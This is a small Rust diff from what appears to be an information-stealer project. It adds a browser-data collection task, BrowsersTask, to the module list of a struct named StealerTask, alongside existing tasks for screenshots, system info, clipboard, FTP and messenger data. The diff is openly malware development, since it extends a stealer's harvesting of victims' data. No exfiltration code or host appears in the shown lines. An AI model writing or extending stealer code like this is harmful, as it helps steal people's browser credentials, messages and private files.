@@ -12,6 +12,7 @@ use crate::processes::ProcessesTask;
 use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use alloc::vec;
+use browsers::BrowsersTask;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
@@ -29,7 +30,8 @@ impl StealerTask {
                 SystemInfoTask,
                 ClipboardTask,
                 FtpTask::new(),
-                MessengersTask::new()
+                MessengersTask::new(),
+                BrowsersTask::new(),
             )
         }
     }
